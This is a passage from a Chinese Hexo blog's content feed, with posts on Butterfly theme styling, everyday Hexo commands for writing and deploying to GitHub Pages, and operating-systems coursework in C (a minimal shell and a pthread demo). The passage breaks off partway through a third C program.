代码块与高亮：技术博客观感的关键</h2><p>技术博客最容易“丑”的地方就是代码块：</p><p>建议方向：</p><ul><li>选择一个你喜欢的高亮主题（浅色/暗色各一套）</li><li>让代码块与正文区分明确（背景、圆角、行距）</li><li>开启行号（可选，长代码更友好）</li><li>复制按钮（强烈推荐）</li></ul><p>Butterfly 通常提供代码高亮相关配置项，你可在主题配置里搜索 <code>highlight</code> / <code>prism</code> / <code>code</code> 等关键词进行调整（不同版本项名略有差异）。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p><hr><h2 id="8-评论系统（可选，但“互动感”很加分）"><a href="#8-评论系统（可选，但“互动感”很加分）" class="headerlink" title="8. 评论系统（可选，但“互动感”很加分）"></a>8. 评论系统（可选，但“互动感”很加分）</h2><p>常见选择（按你偏好）：</p><ul><li>Waline（自建/无登录也能评论）</li><li>Twikoo</li><li>Giscus（GitHub Discussions 驱动，偏程序员风格）</li><li>Valine（老牌，但需要 LeanCloud）</li></ul><p>建议你选一个“维护成本低”的：<strong>Giscus</strong> 或 <strong>Waline</strong>。</p><blockquote><p>Butterfly 对多种评论系统有支持/适配说明，具体按官方文档对应章节配置。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</p></blockquote><hr><h2 id="9-搜索（强烈建议开）：站内内容多了后必备"><a href="#9-搜索（强烈建议开）：站内内容多了后必备" class="headerlink" title="9. 搜索（强烈建议开）：站内内容多了后必备"></a>9. 搜索（强烈建议开）：站内内容多了后必备</h2><p>常见方案：</p><ul><li>Local Search（本地搜索，简单易用）</li><li>Algolia（更强，但需要配置服务）</li></ul><p>你文章超过 30 篇就能明显感受到搜索的价值。</p><hr><h2 id="10-PJAX-与“插件不生效”坑：美化时最常踩"><a href="#10-PJAX-与“插件不生效”坑：美化时最常踩" class="headerlink" title="10. PJAX 与“插件不生效”坑：美化时最常踩"></a>10. PJAX 与“插件不生效”坑：美化时最常踩</h2><p>Butterfly 内置 PJAX（无刷新切换），体验更顺滑，但容易导致：</p><ul><li>某些第三方 JS 在切换页面后不重新执行（比如页脚动画、看板娘等）</li><li>需要给脚本加 <code>data-pjax</code> 或在 PJAX 回调里重新初始化</li></ul><p>例如“页脚养鱼”在 PJAX 下不生效的修复思路：给脚本加 <code>defer data-pjax</code>。(<a href="https://ihave.news/post/20240818194045.html?utm_source=chatgpt.com" title="解决Butterfly页脚养鱼在切换页面时不生效的问题 | 天澄拾光">天澄拾光</a>)</p><p>示例（仅示意）：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src=".../fishes.js"</span> <span class="string">defer</span> <span class="string">data-pjax&gt;&lt;/script&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>如果你开启 PJAX，<strong>任何“只在首次加载执行一次”的脚本</strong>都要重点测试。(<a href="https://cloud.tencent.com/developer/article/1834038?utm_source=chatgpt.com" title="Butterfly的Pjax适配方案-腾讯云开发者社区-腾讯云">腾讯云</a>)</p></blockquote><hr><h2 id="11-一套“推荐美化清单”（照着做就会明显变好看）"><a href="#11-一套“推荐美化清单”（照着做就会明显变好看）" class="headerlink" title="11. 一套“推荐美化清单”（照着做就会明显变好看）"></a>11. 一套“推荐美化清单”（照着做就会明显变好看）</h2><h3 id="11-1-必做（10-分钟见效）"><a href="#11-1-必做（10-分钟见效）" class="headerlink" title="11.1 必做（10 分钟见效）"></a>11.1 必做（10 分钟见效）</h3><ul><li>使用 <code>_config.butterfly.yml</code> 管理主题配置（避免升级痛苦）(<a href="https://butterfly.js.org/en/posts/butterfly-docs-en-get-started/?utm_source=chatgpt.com" title="Butterfly document - Get Started">Butterfly</a>)</li><li>注入 <code>custom.css</code>：圆角、阴影、排版、图片样式</li><li>调好菜单结构（不超过 8 个入口）</li><li>统一封面图风格 + 摘要策略</li></ul><h3 id="11-2-进阶（1-2-小时）"><a href="#11-2-进阶（1-2-小时）" class="headerlink" title="11.2 进阶（1~2 小时）"></a>11.2 进阶（1~2 小时）</h3><ul><li>暗色模式适配（尤其代码块、引用块）</li><li>评论 + 搜索（增强可用性）</li><li>PJAX 开启后逐个排查脚本兼容</li></ul><h3 id="11-3-高级（长期迭代）"><a href="#11-3-高级（长期迭代）" class="headerlink" title="11.3 高级（长期迭代）"></a>11.3 高级（长期迭代）</h3><ul><li>自定义页面：友链页、项目页、相册页</li><li>加“阅读进度”“回到顶部”“文章目录”细节</li><li>性能优化：图片压缩、懒加载、CDN</li></ul><hr><h2 id="12-附：可直接抄用的“美化模板片段”"><a href="#12-附：可直接抄用的“美化模板片段”" class="headerlink" title="12. 附：可直接抄用的“美化模板片段”"></a>12. 附：可直接抄用的“美化模板片段”</h2><h3 id="12-1-引入自定义-CSS-JS"><a href="#12-1-引入自定义-CSS-JS" class="headerlink" title="12.1 引入自定义 CSS/JS"></a>12.1 引入自定义 CSS/JS</h3><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel="stylesheet"</span> <span class="string">href="/css/custom.css"&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src="/js/custom.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="12-2-custom-css（建议从这个起步）"><a href="#12-2-custom-css（建议从这个起步）" class="headerlink" title="12.2 custom.css（建议从这个起步）"></a>12.2 custom.css（建议从这个起步）</h3><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* 全局圆角与阴影（更“卡片化”） */</span></span><br><span class="line"><span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">35px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">08</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正文更易读 */</span></span><br><span class="line"><span class="selector-class">.post-content</span> {</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.85</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 图片统一风格 */</span></span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">img</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">12</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="13-结语：写给未来的自己"><a href="#13-结语：写给未来的自己" class="headerlink" title="13. 结语：写给未来的自己"></a>13. 结语：写给未来的自己</h2><ul><li><strong>美化不是一次性工程</strong>：先把“基础观感”打到 80 分，再慢慢加功能与细节。</li><li>遇到改不动/改崩了：先 <code>git diff</code> 看改了啥；再 <code>hexo clean &amp;&amp; hexo s</code> 排查。</li><li>Butterfly 的配置项多但很强，遇到不确定的项，优先查官方文档与仓库说明。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</li></ul><hr><h2 id="参考资料（建议收藏）"><a href="#参考资料（建议收藏）" class="headerlink" title="参考资料（建议收藏）"></a>参考资料（建议收藏）</h2><ul><li>Butterfly 官方文档站点与 Get Started（安装、升级建议、配置入口）(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</li><li>Butterfly GitHub 仓库（版本、更新、Issues）(<a href="https://github.com/jerryc127/hexo-theme-butterfly?utm_source=chatgpt.com" title="GitHub - jerryc127/hexo-theme-butterfly: A Hexo Theme: Butterfly">GitHub</a>)</li><li>社区美化与配置实践（可抄作思路，但注意与你的版本差异）(<a href="https://blog.r1ce.cn/aa98fabcce67/?utm_source=chatgpt.com" title="Hexo博客之Butterfly主题配置及美化 | Yime's Blog">Yime’s Blog</a>)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客日常维护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客日常使用完整教程</title>
      <link href="/2026/01/29/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B/"/>
      <url>/2026/01/29/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-博客日常使用完整教程（部署-写作-页面管理）"><a href="#Hexo-博客日常使用完整教程（部署-写作-页面管理）" class="headerlink" title="Hexo 博客日常使用完整教程（部署 / 写作 / 页面管理）"></a>Hexo 博客日常使用完整教程（部署 / 写作 / 页面管理）</h1><blockquote><p>本文用于解决一个<strong>非常真实的问题</strong>：<br>👉「Hexo 放了一段时间没用，又忘了该怎么操作」  </p><p>内容涵盖 <strong>部署到 GitHub、写文章、新建页面、日常维护</strong>，<br>建议长期保留在博客中，作为个人 Hexo 使用手册。</p></blockquote><hr><h2 id="一、最重要的事：如何同步到-GitHub（必背）"><a href="#一、最重要的事：如何同步到-GitHub（必背）" class="headerlink" title="一、最重要的事：如何同步到 GitHub（必背）"></a>一、最重要的事：如何同步到 GitHub（必背）</h2><h3 id="✅-一行命令解决-90-场景"><a href="#✅-一行命令解决-90-场景" class="headerlink" title="✅ 一行命令解决 90% 场景"></a>✅ 一行命令解决 90% 场景</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo d -g</span><br></pre></td></tr></tbody></table></figure><p>含义：</p><ul><li><code>hexo g</code>：生成静态文件</li><li><code>hexo d</code>：部署到 GitHub Pages</li><li><code>-g</code>：部署前自动生成</li></ul><p>👉 <strong>写完博客 = 执行这条命令</strong></p><hr><h2 id="二、推荐的完整部署流程（稳妥版）"><a href="#二、推荐的完整部署流程（稳妥版）" class="headerlink" title="二、推荐的完整部署流程（稳妥版）"></a>二、推荐的完整部署流程（稳妥版）</h2><p>当页面异常、样式没更新时，使用完整流程：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>或简写：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="三、本地预览博客（强烈推荐）"><a href="#三、本地预览博客（强烈推荐）" class="headerlink" title="三、本地预览博客（强烈推荐）"></a>三、本地预览博客（强烈推荐）</h2><p>在部署前，先本地看看效果：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></tbody></table></figure><p>或：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></tbody></table></figure><p>访问：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:4000</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="四、新建文章（最常用）"><a href="#四、新建文章（最常用）" class="headerlink" title="四、新建文章（最常用）"></a>四、新建文章（最常用）</h2><h3 id="1️⃣-新建一篇文章"><a href="#1️⃣-新建一篇文章" class="headerlink" title="1️⃣ 新建一篇文章"></a>1️⃣ 新建一篇文章</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new 文章标题</span><br></pre></td></tr></tbody></table></figure><p>例如：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new Hexo使用教程</span><br></pre></td></tr></tbody></table></figure><p>生成文件位置：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">source/_posts/Hexo使用教程.md</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-新建指定类型的文章（如-post）"><a href="#2️⃣-新建指定类型的文章（如-post）" class="headerlink" title="2️⃣ 新建指定类型的文章（如 post）"></a>2️⃣ 新建指定类型的文章（如 post）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new post 文章标题</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="3️⃣-文章头部-Front-matter-说明"><a href="#3️⃣-文章头部-Front-matter-说明" class="headerlink" title="3️⃣ 文章头部 Front-matter 说明"></a>3️⃣ 文章头部 Front-matter 说明</h3><p>新文章顶部一般如下：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span> <span class="string">使用教程</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2026-01-29 10:00:00</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">博客</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">技术</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><ul><li><code>title</code>：文章标题</li><li><code>date</code>：发布时间</li><li><code>tags</code>：标签（可多个）</li><li><code>categories</code>：分类（一般一个）</li></ul><hr><h2 id="五、新建页面（关于页-友链页-等）"><a href="#五、新建页面（关于页-友链页-等）" class="headerlink" title="五、新建页面（关于页 / 友链页 等）"></a>五、新建页面（关于页 / 友链页 等）</h2><h3 id="1️⃣-新建一个页面"><a href="#1️⃣-新建一个页面" class="headerlink" title="1️⃣ 新建一个页面"></a>1️⃣ 新建一个页面</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new page 页面名</span><br></pre></td></tr></tbody></table></figure><p>例如新建「关于我」页面：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></tbody></table></figure><p>生成目录：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">source/about/index.md</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-页面和文章的区别"><a href="#2️⃣-页面和文章的区别" class="headerlink" title="2️⃣ 页面和文章的区别"></a>2️⃣ 页面和文章的区别</h3><table><thead><tr><th>类型</th><th>是否出现在首页</th><th>用途</th></tr></thead><tbody><tr><td>文章（post）</td><td>✅ 是</td><td>博客内容</td></tr><tr><td>页面（page）</td><td>❌ 否</td><td>关于 / 友链 / 标签页</td></tr></tbody></table><hr><h2 id="六、常见功能页面（主题相关）"><a href="#六、常见功能页面（主题相关）" class="headerlink" title="六、常见功能页面（主题相关）"></a>六、常见功能页面（主题相关）</h2><blockquote><p>以下页面通常需要主题支持</p></blockquote><h3 id="1️⃣-标签页"><a href="#1️⃣-标签页" class="headerlink" title="1️⃣ 标签页"></a>1️⃣ 标签页</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></tbody></table></figure><p>并在 <code>source/tags/index.md</code> 中添加：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">tags</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-分类页"><a href="#2️⃣-分类页" class="headerlink" title="2️⃣ 分类页"></a>2️⃣ 分类页</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></tbody></table></figure><p>内容：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">categories</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="七、草稿的使用（可选但很实用）"><a href="#七、草稿的使用（可选但很实用）" class="headerlink" title="七、草稿的使用（可选但很实用）"></a>七、草稿的使用（可选但很实用）</h2><h3 id="1️⃣-新建草稿"><a href="#1️⃣-新建草稿" class="headerlink" title="1️⃣ 新建草稿"></a>1️⃣ 新建草稿</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new draft 草稿名</span><br></pre></td></tr></tbody></table></figure><p>目录：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">source/_drafts/</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-本地预览草稿"><a href="#2️⃣-本地预览草稿" class="headerlink" title="2️⃣ 本地预览草稿"></a>2️⃣ 本地预览草稿</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo s --draft</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="3️⃣-发布草稿"><a href="#3️⃣-发布草稿" class="headerlink" title="3️⃣ 发布草稿"></a>3️⃣ 发布草稿</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo publish 草稿名</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="八、Hexo-常用命令速查表（重点收藏）"><a href="#八、Hexo-常用命令速查表（重点收藏）" class="headerlink" title="八、Hexo 常用命令速查表（重点收藏）"></a>八、Hexo 常用命令速查表（重点收藏）</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo init            <span class="comment"># 初始化博客</span></span><br><span class="line">hexo new             <span class="comment"># 新建文章</span></span><br><span class="line">hexo new page        <span class="comment"># 新建页面</span></span><br><span class="line">hexo new draft       <span class="comment"># 新建草稿</span></span><br><span class="line">hexo publish         <span class="comment"># 发布草稿</span></span><br><span class="line">hexo clean           <span class="comment"># 清理缓存</span></span><br><span class="line">hexo g               <span class="comment"># 生成静态文件</span></span><br><span class="line">hexo s               <span class="comment"># 本地预览</span></span><br><span class="line">hexo d               <span class="comment"># 部署</span></span><br><span class="line">hexo d -g            <span class="comment"># 生成并部署（最常用）</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="九、部署前必要检查（一次配置，长期受用）"><a href="#九、部署前必要检查（一次配置，长期受用）" class="headerlink" title="九、部署前必要检查（一次配置，长期受用）"></a>九、部署前必要检查（一次配置，长期受用）</h2><h3 id="1️⃣-安装-Git-部署插件"><a href="#1️⃣-安装-Git-部署插件" class="headerlink" title="1️⃣ 安装 Git 部署插件"></a>1️⃣ 安装 Git 部署插件</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-config-yml-示例"><a href="#2️⃣-config-yml-示例" class="headerlink" title="2️⃣ _config.yml 示例"></a>2️⃣ <code>_config.yml</code> 示例</h3><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/你的用户名/你的用户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="十、常见问题备忘（救命清单）"><a href="#十、常见问题备忘（救命清单）" class="headerlink" title="十、常见问题备忘（救命清单）"></a>十、常见问题备忘（救命清单）</h2><ul><li>页面没更新<br>→ <code>hexo clean &amp;&amp; hexo d -g</code></li><li><code>hexo d</code> 报错<br>→ 是否安装 <code>hexo-deployer-git</code></li><li>GitHub Pages 404<br>→ 仓库名是否为 <code>用户名.github.io</code></li><li>样式错乱<br>→ 清缓存 + 重新生成</li></ul><hr><h2 id="十一、一句话总结（写给未来的自己）"><a href="#十一、一句话总结（写给未来的自己）" class="headerlink" title="十一、一句话总结（写给未来的自己）"></a>十一、一句话总结（写给未来的自己）</h2><blockquote><p><strong>Hexo 博客日常流程：</strong></p></blockquote><figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">写文章 → 本地预览 → hexo d -g → 完事</span><br></pre></td></tr></tbody></table></figure><hr><p><strong>如果你多年后再看到这篇文章：<br>恭喜你，已经成功救了自己一次 😄</strong></p>]]></content>
      
      
      <categories>
          
          <category> 博客日常维护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统实验及作业</title>
      <link href="/2025/10/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E5%8F%8A%E4%BD%9C%E4%B8%9A/"/>
      <url>/2025/10/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E5%8F%8A%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="📖-操作系统课程作业"><a href="#📖-操作系统课程作业" class="headerlink" title="📖 操作系统课程作业"></a>📖 操作系统课程作业</h2><h3 id="🧪-实验一源代码"><a href="#🧪-实验一源代码" class="headerlink" title="🧪 实验一源代码"></a>🧪 实验一源代码</h3><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INPUT 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ARGS 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">    <span class="type">char</span> input[MAX_INPUT];</span><br><span class="line">    <span class="type">char</span> *args[MAX_ARGS];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"myshell20232316dl&gt; "</span>);</span><br><span class="line">        <span class="keyword">if</span> (fgets(input, MAX_INPUT, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) {</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// 处理EOF (Ctrl+D)</span></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 去除换行符</span></span><br><span class="line">        input[<span class="built_in">strcspn</span>(input, <span class="string">"\n"</span>)] = <span class="string">'\0'</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 处理exit命令</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(input, <span class="string">"exit"</span>) == <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 跳过空输入</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(input) == <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 分割输入为命令和参数</span></span><br><span class="line">        <span class="type">char</span> *token;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        token = strtok(input, <span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">while</span>(token != <span class="literal">NULL</span> &amp;&amp; i &lt; MAX_ARGS - <span class="number">1</span>) {</span><br><span class="line">            args[i++] = token;</span><br><span class="line">            token = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">        }</span><br><span class="line">        args[i] = <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建子进程执行命令</span></span><br><span class="line">        pid = fork();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pid &lt; <span class="number">0</span>) {</span><br><span class="line">            perror(<span class="string">"fork failed"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) {</span><br><span class="line">            <span class="comment">// 子进程执行命令</span></span><br><span class="line">            execvp(args[<span class="number">0</span>], args);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果execvp返回，说明执行失败</span></span><br><span class="line">            perror(<span class="string">"execvp failed"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// 父进程等待子进程结束</span></span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Child exited with status %d\n"</span>, WEXITSTATUS(status));</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="🌟作业二源代码"><a href="#🌟作业二源代码" class="headerlink" title="🌟作业二源代码"></a>🌟作业二源代码</h3><p>任务一：多线程运行结果记录与分析</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread_func</span><span class="params">(<span class="type">void</span>* arg)</span> {</span><br><span class="line">    <span class="type">long</span> id = (<span class="type">long</span>)arg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"线程 %ld 正在运行第 %d 次，线程ID = %lu\n"</span>, id, i, pthread_self());</span><br><span class="line">        usleep(<span class="number">100000</span>); <span class="comment">// 微秒级休眠，制造时间片切换</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"作业二第一部分：\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"主线程开始创建子线程...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> tid[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) {</span><br><span class="line">        pthread_create(&amp;tid[i], <span class="literal">NULL</span>, thread_func, (<span class="type">void</span>*)i);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) pthread_join(tid[i], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"所有线程执行完毕。\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>任务二：进程地址空间分析</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量和函数用于标识不同区段</span></span><br><span class="line"><span class="type">int</span> global_var = <span class="number">10</span>;            <span class="comment">// 数据段</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> const_global = <span class="number">100</span>;   <span class="comment">// 只读数据段</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">code_func</span><span 